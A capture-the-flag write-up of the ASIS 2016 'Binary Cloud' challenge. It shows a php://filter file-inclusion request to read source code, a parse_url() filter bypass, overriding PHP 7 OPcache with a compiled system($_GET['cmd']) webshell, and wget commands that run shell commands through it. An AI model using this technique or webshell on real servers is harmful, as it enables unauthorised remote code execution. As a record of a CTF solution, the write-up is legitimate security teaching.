---
layout: post
title: Binary Cloud
category: ASIS-2016
---

## Description

You can upload anything you want! (But please, do not inject php files.)
Due to the security issues, you can only upload one file per request.
Note that the server removes all uploaded/cached files every minute.

Regards,
ASIS Team.

---

## The Challenge

This was a very fun challenge for me, as it was based off my own [research](http://blog.gosecure.ca/2016/04/27/binary-webshell-through-opcache-in-php-7/).

**1. Information Gathering**

I started things off by looking for a `robots.txt` file.

Going to `https://binarycloud.asis-ctf.ir/robots.txt` shows us three entries :

![robots](/assets/img/asis-2016/robots.png){:width="200"}

Visiting the `/cache` and `/uploads` pages show us a `forbidden` message.
On the other hand, following the link `/debug.php` gives us a `phpinfo()` page!

![phpinfo](/assets/img/asis-2016/phpinfo.png)

From this page, we know that they're running PHP 7.0.4.

As the description and `robots.txt` mentionned cache files, I checked if OPcache is enabled. Turns out it is, and its location corresponds to the `/cache` folder found in the robots.txt file :

``` ini
opcache.file_cache=/home/binarycloud/www/cache
```
**2. Obtaining the Source Code**

Looking at the URLs, we can notice right away a potential LFI vulnerability, as the upload module URL looks like the following :

```
https://binarycloud.asis-ctf.ir/?page=upload
```

We can use [PHP wrappers](http://php.net/manual/en/wrappers.php.php) to obtain the source code :

```
http://binarycloud.asis-ctf.ir?page=php://filter/convert.base64-encode/resource=upload
```

Viewing the source of the URL above will give us the `base64` encoded source code :

![base64](/assets/img/asis-2016/base64.png)

This is a section of the `upload.php` script :

``` php
<?php
function ew($haystack, $needle) {
    return $needle === "" || (($temp = strlen($haystack) - strlen($needle)) &gt;= 0 &amp;&amp; strpos($haystack, $needle, $temp) !== false);
}

function filter_directory(){
  $data = parse_url($_SERVER['REQUEST_URI']);
  $filter = ["cache", "binarycloud"];
  foreach($filter as $f){
    if(preg_match("/".$f."/i", $data['query'])){
      die("Attack Detected");
    }
  }
}

function error($msg){
  die("&lt;script&gt;alert('$msg');history.go(-1);&lt;/script&gt;");
}

filter_directory();

if($_SERVER['QUERY_STRING'] &amp;&amp; $_FILES['file']['name']){
  if(!file_exists($_SERVER['QUERY_STRING'])) error("error3");
  $name = preg_replace("/[^a-zA-Z0-9\.]/", "", basename($_FILES['file']['name']));
        if(ew($name, ".php")) error("error");
  $filename = $_SERVER['QUERY_STRING'] . "/" . $name;
  if(file_exists($filename)) error("exists");
  if (move_uploaded_file($_FILES['file']['tmp_name'], $filename)){
    die("uploaded at &lt;a href=$filename&gt;$filename&lt;/a&gt;&lt;hr&gt;&lt;a href='javascript:history.go(-1);'&gt;Back&lt;/a&gt;");
  }else{
    error("error");
  }
}
?>
```

From this code, we know that :

  - We can't upload `.php` files.
  - Our request URI must not contain the strings `cache` or `binarycloud`.
  - Our filename is filtered through `preg_replace()` and `basename()`.

Since we can't upload `.php` files, the goal will most likely be to inject `.php.bin` files in the `/cache` folder so we can run our own code.

**3. Bypass filter_directory()**

The upload module takes the query string of our POST request and uses it as the destination folder for our file.

Sending a POST request at `/upload.php?TEST` will try to upload our file in the `TEST/` folder.

Since we want to upload in the `cache/` folder, we need to send our POST request to `/upload.php?cache`.
The problem here is that `filter_directory` will block us from using the `cache` keyword :

``` php
<?php
function filter_directory(){
  $data = parse_url($_SERVER['REQUEST_URI']);
  $filter = ["cache", "binarycloud"];
  foreach($filter as $f){
    if(preg_match("/".$f."/i", $data['query'])){
      die("Attack Detected");
    }
  }
}
?>
```

This function can be bypassed though, as `parse_url` takes a `URL` as a parameter. It does not deal well with `URIs`.

Sending a request to `///upload.php?cache` (note the additional slashes) will make `parse_url()` interpret the `URI` as a malformed `URL` and will return `false`. Therefore, `preg_match()` will never match the filtered strings.

**4. Creating our Payload**


As we've mentionned earlier, the challenge uses OPcache as their caching engine.

Our goal is to override the cache file of either `debug.php`, `index.php` or `upload.php`, so that when we'll request those pages, the webserver will serve up our malicious cache file instead of the original content.

We'll need my tools on [github](https://github.com/GoSecure/php7-opcache-override). We also have a full guide on how to override cache files [here](http://blog.gosecure.ca/2016/04/27/binary-webshell-through-opcache-in-php-7/).

From the `debug.php` page, we know that it's an x86_64 platform. I deployed a 64 bit Ubuntu VM with PHP 7 installed and I generated a cache file named `debug.php.bin`.

The generated cache file is a compiled version of the following webshell :

``` php
<?php
  system($_GET['cmd']);
?>
```

I then calculated the `system_id` used by our target webserver by using the `system_id_scraper.py` script found in my github repo :

``` shell
$ ./system_id_scraper.py https://binarycloud.asis-ctf.ir/debug.php
PHP version : 7.0.4-7ubuntu2
Zend Extension ID : API320151012,NTS
Zend Bin ID : BIN_SIZEOF_CHAR48888
Assuming x86_64 architecture
------------
System ID : 81d80d78c6ef96b89afaadc7ffc5d7ea
```

Finally, I changed the `system_id` of `debug.php.bin` with the one of the server using a hex editor.

The resulting `debug.php.bin` is a compiled version of a webshell configured to be used by the server's OPcache.

**5. Finale**

Finally, it's time to send our payload.

I uploaded the `debug.php.bin` file and intercepted it with Burpsuite. At this point, we have to set the path of the server-side `debug.php.bin` that we want to overwrite.

The path of the current `debug.php.bin` is at `[cache location][system id][document root][debug.php.bin]`. The only thing missing is the document root, which is available in the `/debug.php` page.

We also need to add the extra slashes to bypass the `filter_directory()` function.

Here's my payload :

![payload](/assets/img/asis-2016/payload.png)

Now, when we navigate to `https://binarycloud.asis-ctf.ir/debug.php`, we have our webshell!

The flag is located at the root of the filesystem :

``` shell
$ wget -qO- https://binarycloud.asis-ctf.ir/debug.php?cmd="ls /"
WH4T_1S_7H3_FL4G
bin
boot
dev
etc
home
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
```
``` shell
$ wget -qO- https://binarycloud.asis-ctf.ir/debug.php?cmd="cat /WH4T_1S_7H3_FL4G"
ASIS{5e00f204374f9ce481acc97294eda1f0}
```

**Flag :** ASIS{5e00f204374f9ce481acc97294eda1f0}
